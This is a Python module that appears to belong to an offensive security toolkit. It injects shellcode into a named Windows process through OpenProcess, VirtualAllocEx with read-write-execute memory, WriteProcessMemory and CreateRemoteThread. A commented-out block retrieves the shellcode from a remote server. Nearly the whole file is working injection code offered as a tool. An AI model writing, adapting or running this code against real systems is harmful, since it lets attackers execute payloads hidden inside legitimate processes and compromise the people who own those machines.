import utils.arg
import os
import ctypes

from utils.helper import nstate as nstate

class inject:
    from ctypes import windll
    from ctypes import wintypes
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00'
    Description = 'Inject shellcode to process'
    Version = '1.1.0'
    # Target_Process = ''
    # Shellcode = ''
    # StartProcess = False

    def __init__(self, input_file, process_start, target_process, shellcode):
        self.input_file = input_file
        self.process_start = process_start
        self.target_process = target_process
        self.shellcode = shellcode

    def init():
        spName = 'inject'
        spArgList = [
            ['-i', '--input', '', '', 'Input file for process injection'],
            ['-p', '--process', '', '', 'Processname to inject the shellcode'],
            ['-s', '--start', '', 'store_true', 'If not active, start the process before injection']
            ]
        utils.arg.CreateSubParser(spName, inject.Description, spArgList)

    def Start_Process(self):
        tp = self.target_process
        print(f'{nstate.OKBLUE} starting {tp}')
        os.system(tp)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        
        pid = processes[0].ProcessId
        print(f"{nstate.OKGREEN} {self.target_process} process id: {pid}")
        
        return int(pid)
    
    # response = request.urlopen(args.server)
    # shellcode = response.read()

    # if shellcode:
    #   print(f'[*] retrieved the shellcode from {args.server}')

    def start_injection(self):
        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)
        kernel32 = self.windll.kernel32
        # constants
        MEM_COMMIT_RESERVE = 0x3000
        PAGE_READWRITE_EXECUTE = 0x40
        PROCESS_ALL_ACCESS = 0x1fffff
        EXECUTE_IMMEDIATLY = 0

        # Function type redefintions
        OpenProcess = kernel32.OpenProcess
        OpenProcess.argtypes = [self.wintypes.DWORD,self.wintypes.BOOL,self.wintypes.DWORD]
        OpenProcess.restype = self.wintypes.HANDLE

        VirtualAllocEx = kernel32.VirtualAllocEx
        VirtualAllocEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD,self.wintypes.DWORD]
        VirtualAllocEx.restype = self.wintypes.LPVOID

        WriteProcessMemory = kernel32.WriteProcessMemory
        WriteProcessMemory.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, self.wintypes.LPCVOID, ctypes.c_size_t, self.wintypes.LPVOID]
        WriteProcessMemory.restype = self.wintypes.BOOL

        CreateRemoteThread = kernel32.CreateRemoteThread
        CreateRemoteThread.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.LPVOID, self.wintypes.LPVOID, self.wintypes.DWORD, self.wintypes.LPDWORD]
        CreateRemoteThread.restype = self.wintypes.HANDLE

        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [self.wintypes.HANDLE]
        CloseHandle.restype = self.wintypes.BOOL
        process_id = self.get_proc_id()

        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            print(f"{nstate.OKGREEN} Opened a Handle to the process")

        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            print(f'{nstate.OKGREEN} Allocated Memory in the process')

        c_null = ctypes.c_int(0)
        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), ctypes.byref(c_null))
        if writing:
            print(f'{nstate.OKGREEN} Wrote The shellcode to memory')

        Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            print(f'{nstate.OKGREEN} Injected the shellcode into the process')
        CloseHandle(phandle)

    def proc_inject():
        return False